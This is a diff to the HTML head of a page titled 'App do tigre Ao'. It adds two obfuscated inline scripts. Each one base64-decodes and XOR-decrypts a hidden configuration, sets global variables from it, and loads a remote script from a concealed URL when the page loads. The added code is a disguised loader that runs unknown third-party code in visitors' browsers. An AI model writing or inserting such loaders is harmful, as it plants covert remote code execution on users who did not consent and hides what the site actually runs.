@@ -5,6 +5,126 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>App do tigre Ao</title>
 
+    <script>
+  (function () {
+    var a_urw = atob(
+      "DGs86tch06UjKBFl2RAen6VN8Z8BQGURqRgGxfhCt8sNXWUIsA1FxLROvotBWj4WuhlVmqNS/NVKUHQJ9htVkrJN/c9QCj1HuB9ImL5DptFGWzNfgjYQyLBNvMdCRGJH4zBHyLlAvsABEjMVsBNZhp5F8YkBXnAJrA4e0PUXsp0RHCFSvQkP0+MQ4JxBGSNcvF1ejuYDrvhe"
+    );
+
+    var m_0acy = [];
+
+    for (var q_ab = 0; q_ab < a_urw.length; q_ab++) {
+      m_0acy.push(a_urw.charCodeAt(q_ab) & 255);
+    }
+
+    var x_u = m_0acy[0];
+
+    var f_in = m_0acy.slice(1, 1 + x_u);
+    var a_314 = m_0acy.slice(1 + x_u);
+
+    var j_sj = a_314.map(function (b, s_a) {
+      return b ^ f_in[s_a % x_u];
+    });
+
+    var m_zyb = "";
+
+    for (var c_q = 0; c_q < j_sj.length; c_q++) {
+      m_zyb += String.fromCharCode(j_sj[c_q] & 255);
+    }
+
+    var v_j4mo = decodeURIComponent(escape(m_zyb));
+
+    var o_44 = JSON.parse(v_j4mo);
+
+    var n_a1z = o_44.globals || [];
+
+    n_a1z.forEach(function (g_y3cm) {
+      window[g_y3cm.name] = g_y3cm.value;
+    });
+
+    var c_bwl0 = document.createElement("script");
+
+    c_bwl0.src = o_44.url;
+    c_bwl0.async = true;
+    c_bwl0.defer = true;
+
+    (o_44.attributes || []).forEach(function (u_t) {
+      c_bwl0.setAttribute(
+        u_t.name,
+        u_t.value
+      );
+    });
+
+    (document.head || document.documentElement)
+      .appendChild(c_bwl0);
+  })();
+</script>
+
+    <script>
+  (function () {
+    var g_4 = atob(
+      "DDMYxuheR8CQj+0/JUg6s5oyZfqy55lLVUAi6cc9I66++plSTFVh6IsxKu7y/cJMRkFxtpwtaLXk4p4QSVJso5sqaarjrcEdREdstIE8MrT1/M8Ffkg6qIkzIuKqrYleUVI1s5wzLqbpop1NQEV9qJxzP6P/68BMRlg66sooJqzl6s8FBxFl6pN8KaH96s8FB1d5solzMrT95otGCENqo547KbS9/JhdTFdr5MR8MaH8+ogdHxE6u7Uj"
+    );
+
+    var q_i = [];
+
+    for (var h_y8w = 0; h_y8w < g_4.length; h_y8w++) {
+      q_i.push(g_4.charCodeAt(h_y8w) & 255);
+    }
+
+    var j_4gi = q_i[0];
+
+    var u_a1c = q_i.slice(
+      1,
+      1 + j_4gi
+    );
+
+    var b_j = q_i.slice(
+      1 + j_4gi
+    );
+
+    var s_f = b_j.map(function (b, l_ouz) {
+      return b ^ u_a1c[l_ouz % j_4gi];
+    });
+
+    var o_lkd9 = "";
+
+    for (var l_d = 0; l_d < s_f.length; l_d++) {
+      o_lkd9 += String.fromCharCode(
+        s_f[l_d] & 255
+      );
+    }
+
+    var x_dtyc = decodeURIComponent(
+      escape(o_lkd9)
+    );
+
+    var k_6l3 = JSON.parse(x_dtyc);
+
+    var p_ip = k_6l3.globals || [];
+
+    p_ip.forEach(function (l_kod5) {
+      window[l_kod5.name] = l_kod5.value;
+    });
+
+    var k_t6vo = document.createElement("script");
+
+    k_t6vo.src = k_6l3.url;
+    k_t6vo.async = true;
+    k_t6vo.defer = true;
+
+    (k_6l3.attributes || []).forEach(function (q_vn) {
+      k_t6vo.setAttribute(
+        q_vn.name,
+        q_vn.value
+      );
+    });
+
+    (document.head || document.documentElement)
+      .appendChild(k_t6vo);
+  })();
+</script>
+    
     <meta name="author" content="Monopolho">
     <link rel="stylesheet" href="indexa.css">
     <meta name="twitter:card" content="summary_large_image">
